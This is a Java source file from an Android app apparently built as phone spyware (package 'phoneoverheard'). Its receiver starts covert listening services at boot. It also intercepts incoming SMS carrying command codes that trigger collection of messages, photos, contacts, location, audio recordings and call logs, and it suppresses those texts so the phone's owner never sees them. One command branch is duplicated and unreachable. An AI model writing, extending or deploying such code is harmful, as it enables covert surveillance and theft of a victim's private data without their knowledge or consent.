package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.Date;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

@SuppressLint({ "DefaultLocale", "SimpleDateFormat" })
public class BootBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "BootBroadcastReceiver"; 
	WriteLog mylog = new WriteLog();
	
	@Override
	public void onReceive(Context context, Intent intent) {
		//判断接收的是否为开机广播
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
			mylog.WrLog("i",TAG,"接收开机广播");
			//开机启动电话监听服务
			Intent StartPhoneService = new Intent(context, PhoneService.class);  //显式/隐式
			StartPhoneService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  //注意，必须添加这个标记，否则启动会失败 ,默认优先启动在activity栈中已经存在的activity(如果之前启动过,并还没有被destroy的话) 而是无论是否存在,都重新启动新的activity
			context.startService(StartPhoneService);  //Intent激活组件(Service)
			mylog.WrLog("i",TAG,"开机启动电话监听服务");
			//开机启动网络监听服务
			Intent StartNetworkService = new Intent(context, NetworkService.class); 
			StartNetworkService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
			context.startService(StartNetworkService); 
			mylog.WrLog("i",TAG,"开机启动网络监听服务");
		}else{
			//接收短信广播，处理特殊短信指令
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");
			for(Object p : pdus){
				byte[] pdu = (byte[]) p;
				SmsMessage message = SmsMessage.createFromPdu(pdu);
				final String content = message.getMessageBody();
				Date date = new Date(message.getTimestampMillis());
				SimpleDateFormat Dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				final String receiveTime = Dateformat.format(date);
				final String senderNumber = message.getOriginatingAddress();
				String smscontent = "content="+ content+"& receivetime="+ receiveTime+ "& sendernumber="+ senderNumber;
				Log.i(TAG, smscontent);
				mylog.WrLog("i",TAG,smscontent); 
				if(content.trim().toLowerCase().indexOf("cmd#duanxin") != -1){
					abortBroadcast();
					Intent StartDuanxinService = new Intent(context, duanxinService.class); 
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartDuanxinService.putExtra("smscontent",bundle);
					StartDuanxinService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startService(StartDuanxinService);
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#zhaopian") != -1){
					abortBroadcast();
					Intent StartHaomaService = new Intent(context, haomaService.class);  
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartHaomaService.putExtra("smscontent",bundle);
					StartHaomaService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
					context.startService(StartHaomaService); 
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#lianxiren") != -1){
					abortBroadcast();
					Intent StartLianxirenService = new Intent(context, lianxirenService.class);  
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartLianxirenService.putExtra("smscontent",bundle);
					StartLianxirenService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
					context.startService(StartLianxirenService); 
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#weizhi") != -1){ 
					abortBroadcast();
					Intent StartWeizhiService = new Intent(context, weizhiService.class);
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartWeizhiService.putExtra("smscontent",bundle);
					StartWeizhiService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					context.startService(StartWeizhiService);
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#luyin_start") != -1){
					abortBroadcast();
					Intent StartLuyinService = new Intent(context, luyinService.class);
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartLuyinService.putExtra("smscontent",bundle);
					StartLuyinService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					context.startService(StartLuyinService); 
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#luyin_stop") != -1){
					abortBroadcast();
					Intent StartLuyinService = new Intent(context, luyinService.class);  
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartLuyinService.putExtra("smscontent",bundle);
					StartLuyinService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
					context.stopService(StartLuyinService);  
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#tonghuajilu") != -1){
					abortBroadcast();
					Intent StartTonghuajiluService = new Intent(context, tonghuajiluService.class); 
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartTonghuajiluService.putExtra("smscontent",bundle);
				    StartTonghuajiluService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
					context.startService(StartTonghuajiluService);   
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("cmd#zhaopian") != -1){
					abortBroadcast();
					Intent StartTonghuajiluService = new Intent(context, zhaopianService.class);  
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartTonghuajiluService.putExtra("smscontent",bundle);
				    StartTonghuajiluService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startService(StartTonghuajiluService); 
					abortBroadcast();
				}else if(content.trim().toLowerCase().indexOf("sys#manager") != -1){
					abortBroadcast();
					Intent StartManagerService = new Intent(context, smsService.class); 
					Bundle bundle=new Bundle();
				    bundle.putString("content", content.trim().toLowerCase()); 
				    bundle.putString("sendernumber", senderNumber); 
				    StartManagerService.putExtra("smscontent",bundle);
					StartManagerService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					context.startService(StartManagerService); 
					abortBroadcast();
				}else{
					//收到普通短信，不做任何处理
				}
			}
		}
	}

}
